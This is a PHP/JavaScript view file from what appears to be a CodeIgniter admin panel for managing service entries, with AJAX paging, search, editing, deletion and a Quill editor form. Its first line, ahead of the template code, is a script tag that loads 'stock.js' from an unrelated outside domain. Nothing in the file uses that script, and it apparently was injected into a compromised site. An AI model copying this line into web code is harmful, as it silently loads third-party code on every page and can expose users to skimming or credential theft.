<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script>
<?php $data[$this->pages]=$this->layanan;$data['focus']=$this->judul; $this->load->view($this->generalHeader,$data) ?>
<div id="result-content"></div>
<?php form($this->layanan,$baseView,"modal-xl"); ?>

<script>
    var urlLocal    = `${strSection}/${strLayanan}/`;
    var urlRead     = strRead,urlSave=strSave,urlDelete=strDelete,urlEdit=strEdit;
    var pages       = "<?=$data[$this->pages]?>";
    var nama        = attrId(strJudul);
    var modalForm   = attrId(`${strModal}${pages}`);
    var formInput   = attrId(strFormInput);
    var paramForm   = attrId(strParam);
    var resultContent=attrId(strResultContent);
    var anyPage     = attrId(`${strAny}${pages}`);
    var wrapImg     = attrId(strwrapImg);
    var quill;
    var noImg=2;
    var no=1;
    $(document).ready(function() {
        quill = setCkeditor(strDeskripsi);

        loadData();
    });

    function nextLoad(par){
        var lastRow = toInt(attrId(strLastRows).val());
        var totalRow= toInt(attrId(strTotalRows).val());
        totalRow>lastRow&&loadData(toInt(no)+par);
    }
    function prevLoad(par){
        no > 1&&loadData(toInt(no)-par);
    }
    function loadData(page=1,isCache=true){
        no=page;
        var where=page;
        var any = anyPage.val()!==""?"?any="+anyPage.val():"";
        var totalRows = isNumber(attrId(strTotalRows).val());
        var url=base_url+urlLocal+urlRead;
        where+=any;
        if(!isCache) {
            if(totalRows === 0 ){localCache.remove(url+where);}
            else{for(var i=0;i<totalRows;i++){localCache.remove(url+`${i+1}${any}`);}}
        }
        ajaxView(urlLocal+urlRead+where,null,function(res){resultContent.html(res);});
    }
    function cari(e, val) {
        if (e.keyCode === 13) {
            anyPage.val(val);
            timeOut(function(){loadData(1,false);})
        }
    }
    function ubah(id) {
        var baseUrl=base_url+urlLocal+urlEdit+"/"+id;
        handleCacheEdit(baseUrl,function(res){
            if (res.status) {
                setFocus(strJudul);
                var data        = res.res_data;
                var dataId      = [strId,strJudul,strDeskripsi,strIcon,strStatus,strGambar];
                dataId.forEach(function(row){
                    if(row===strDeskripsi)setQuill(quill,data[row]);
                    else if(row===strGambar)setFileImage(data[row],strLayanan);
                    else setIdSelect(row,data[row]);
                });
            } else {
                notif(strError);
            }
        });
    }
    function hapus(id) {
        validateDeleteHtml(base_url+urlLocal+urlDelete,id,anyPage.val(),function(page,isCache){
            if(page===1) {
                anyPage.val("");
                attrId(strActiveRows).val(`${page}`)
            }
            loadData(page,isCache);
        })
    }
    formInput.validate({
        rules: {
            judul: {required: true},
            icon: {required: true},
            "file_upload[]": { required:true }
        },
        errorPlacement: handleError(),
        submitHandler: function (form) {
            if(!isQuill(quill.container.innerText)){
                timeOut(function(){
                    quill.focus();
                });
                return;
            }
            var formData=new FormData(formInput[0]);
            var myEditor = document.querySelector(`#${strDeskripsi}`);
            var html = myEditor.children[0].innerHTML;
            formData.append(strDeskripsi, html);
            ajaxFile(base_url+urlLocal+urlSave,formData,function (res) {
                if (res.status) {
                    validateSaveHmtl(nama.val(),anyPage.val(),paramForm.val(),function(page,searchName){
                        if(!searchName && paramForm.val()===strEdit) anyPage.val("");
                        loadData(`${page}`,false);
                        notif(strSuccess);
                        delForm(formInput);
                        paramForm.val(strAdd);
                        modalForm.modal(strHide);
                    });


                } else {
                    notif(strFailed);
                }
            })
        }
    });

    modalForm.on(strHideModal, function () {
        noImg = 2;
        delForm(formInput);
        delImage();
        timeOut(function(){
            delQuill(quill);
        })
    });



</script>